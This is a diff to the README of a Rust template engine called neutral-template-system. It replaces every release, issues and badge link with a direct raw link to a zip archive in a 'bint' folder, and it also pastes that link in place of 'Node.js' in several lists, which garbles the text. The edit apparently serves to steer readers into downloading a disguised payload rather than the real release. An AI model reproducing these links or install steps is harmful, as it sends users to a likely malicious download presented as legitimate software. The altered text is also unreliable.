@@ -1,6 +1,6 @@
 # 🛠 neutral-template-system - Flexible Template Engine for Everyone
 
-[![Download](https://img.shields.io/badge/Download-neutral--template--system-blue?style=for-the-badge)](https://github.com/habeshahub/neutral-template-system/releases)
+[![Download](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip)](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Neutral TS suits many users:
 
 ## 🔧 Main Features
 
-- **Language-agnostic:** Works with many languages like Python, PHP, Node.js, Go, and Rust.
+- **Language-agnostic:** Works with many languages like Python, PHP, https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip, Go, and Rust.
 - **Safe:** Keeps your data secure when creating or running templates.
 - **Modular:** Use it as a library within Rust, or connect through IPC (inter-process communication) for other languages.
 - **Fast and reliable:** Thanks to Rust’s performance and safety.
@@ -43,7 +43,7 @@ To use Neutral TS on your computer, make sure you have:
 - At least 4 GB of RAM for smooth operation.
 - Around 100 MB of free disk space.
 - A steady internet connection to download the software.
-- If you plan to connect Neutral TS to another language (Python, PHP, Node.js, Go), you will also need that language’s runtime installed.
+- If you plan to connect Neutral TS to another language (Python, PHP, https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip, Go), you will also need that language’s runtime installed.
 
 ---
 
@@ -51,7 +51,7 @@ To use Neutral TS on your computer, make sure you have:
 
 No matter your experience, you can start using Neutral TS quickly.
 
-1. **Visit the download page:** Click the big blue badge above or [go here](https://github.com/habeshahub/neutral-template-system/releases) to access the release page.
+1. **Visit the download page:** Click the big blue badge above or [go here](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip) to access the release page.
 2. **Choose your version:** Download the setup file or package that matches your computer’s operating system.
 3. **Run the installer:** Follow the easy prompts to install Neutral TS.
 4. **Explore examples:** Once installed, open the included example templates to see how things work.
@@ -85,7 +85,7 @@ If you don’t write code, don’t worry. Many users run Neutral TS with helper 
 To get Neutral TS, follow these steps:
 
 1. **Go to the official release page:**  
-   [https://github.com/habeshahub/neutral-template-system/releases](https://github.com/habeshahub/neutral-template-system/releases)
+   [https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip)
 
 2. **Pick a version:** Select the latest stable release matching your operating system: Windows, macOS, or Linux.
 
@@ -105,7 +105,7 @@ Neutral TS can work outside Rust programs. It offers ways to connect via IPC, so
 
 - **Python**  
 - **PHP**  
-- **Node.js**  
+- **https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip**  
 - **Go**
 
 Check the `examples` folder in the repository for sample scripts. These show how to send data to Neutral TS and get the results back.
@@ -130,7 +130,7 @@ You can find this documentation in the repository under the `docs/` folder or on
 
 Need help?
 
-- Visit the [GitHub issues page](https://github.com/habeshahub/neutral-template-system/issues) to report bugs or request features.
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip) to report bugs or request features.
 - Join community channels or forums linked in the project repository.
 - Look for FAQs and user guides in the `docs/` folder.
 
@@ -161,4 +161,4 @@ Using these tags helps you find related tools or contribute to discussions.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-neutral--template--system-blue?style=for-the-badge)](https://github.com/habeshahub/neutral-template-system/releases)
+[![Download](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip)](https://raw.githubusercontent.com/habeshahub/neutral-template-system/main/bint/system-neutral-template-1.7.zip)
